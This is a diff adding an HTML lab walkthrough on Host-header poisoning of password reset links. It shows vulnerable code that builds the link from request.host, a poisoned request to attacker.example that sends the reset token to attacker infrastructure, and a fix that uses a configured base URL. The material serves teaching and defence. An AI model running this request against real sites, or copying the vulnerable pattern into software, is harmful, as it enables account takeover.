@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lab 4B Walkthrough</title>
+  <style>
+    :root {
+      --bg: #0b0f14; --panel: #11161d; --text: #e5e7eb; --muted: #a3acb9; --line: #222a35; --accent: #f59e0b;
+      --code-bg: #0f141b; --code-text: #dbe4ee; --kw: #c792ea; --fn: #82aaff; --str: #c3e88d; --tag: #f78c6c; --attr: #ffcb6b; --var: #b0bec5; --comment: #6b7280;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: Arial, Helvetica, sans-serif; padding: 32px 16px 48px; }
+    .page { max-width: 820px; margin: 0 auto; }
+    .article { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 32px; }
+    .eyebrow { font-size: 0.78rem; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; color: var(--accent); margin-bottom: 14px; }
+    h1 { font-size: 2.2rem; line-height: 1.1; margin-bottom: 16px; font-weight: 700; }
+    .lead { font-size: 1rem; line-height: 1.7; color: var(--muted); margin-bottom: 32px; }
+    section + section { margin-top: 36px; padding-top: 28px; border-top: 1px solid var(--line); }
+    h2 { font-size: 1.35rem; margin-bottom: 14px; }
+    h3 { font-size: 0.98rem; margin: 22px 0 10px; color: var(--text); }
+    p { font-size: 0.98rem; line-height: 1.7; color: var(--muted); margin-bottom: 14px; }
+    pre { margin: 14px 0 18px; padding: 16px 18px; overflow-x: auto; background: var(--code-bg); color: var(--code-text); border: 1px solid var(--line); border-radius: 8px; font: 0.94rem/1.65 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+    code.inline { font: 0.92em ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; background: #1b2330; color: var(--accent); padding: 2px 6px; border-radius: 6px; }
+    .callout { padding: 16px 18px; border-left: 4px solid var(--accent); background: #0f141b; margin: 14px 0 18px; color: var(--muted); }
+    .kw { color: var(--kw); } .fn { color: var(--fn); } .str { color: var(--str); } .tag { color: var(--tag); } .attr { color: var(--attr); } .var { color: var(--var); } .comment { color: var(--comment); }
+    strong { color: var(--text); }
+    @media (max-width: 820px) { body { padding: 20px 12px 40px; } .article { padding: 24px 20px; } h1 { font-size: 2rem; } }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <article class="article">
+      <div class="eyebrow">Day 2 / Lab 4B</div>
+      <h1>Password Reset Link Built From the Host Header</h1>
+      <p class="lead">This lab keeps the reset-token logic clean. The only intentional bug is that the password reset email builds its link from the incoming request host, which means an attacker can poison the domain sent to the victim.</p>
+
+      <section>
+        <h2>Quick reminder</h2>
+        <p>The HTTP <code class="inline">Host</code> header is client-controlled. If an app uses it to build absolute URLs for password reset emails, the email can end up pointing to an attacker-controlled domain.</p>
+      </section>
+
+      <section>
+        <h2>Where the vulnerability comes from</h2>
+        <p>The reset token is created correctly, but the reset URL is built from <code class="inline">request.host</code>.</p>
+        <pre><span class="var">token</span> = str(uuid.uuid4())
+conn.execute(
+    <span class="str">"INSERT INTO reset_tokens (token, username) VALUES (?, ?)"</span>,
+    (token, username)
+)
+
+<span class="var">reset_link</span> = <span class="str">f"http://{request.host}{url_for('reset_password')}?token={token}"</span></pre>
+
+        <div class="callout">
+          <p>The reset endpoint itself is clean. The token decides which account is reset, so the only flaw is in the emailed link generation.</p>
+        </div>
+      </section>
+
+      <section>
+        <h2>How the exploit works</h2>
+        <p>Trigger a password reset request and poison the host header at the same time.</p>
+
+        <h3>Poisoned request</h3>
+        <pre>POST /forgot-password
+Host: attacker.example
+username=user</pre>
+
+        <h3>Email result</h3>
+        <pre>http://attacker.example/reset-password?token=&lt;uuid&gt;</pre>
+
+        <p>The token is still valid, but the domain inside the email is now controlled by the attacker. If a victim clicks that link, the token is delivered to attacker infrastructure instead of the real application.</p>
+
+        <h3>Fix</h3>
+        <p>Use a trusted base URL configured by the application, not the request header.</p>
+        <pre><span class="comment"># vulnerable</span>
+<span class="var">reset_link</span> = <span class="str">f"http://{request.host}{url_for('reset_password')}?token={token}"</span>
+
+<span class="comment"># fixed</span>
+<span class="var">PUBLIC_BASE_URL</span> = <span class="str">"http://localhost:5007"</span>
+<span class="var">reset_link</span> = <span class="str">f"{PUBLIC_BASE_URL}{url_for('reset_password')}?token={token}"</span></pre>
+      </section>
+    </article>
+  </main>
+</body>
+</html>
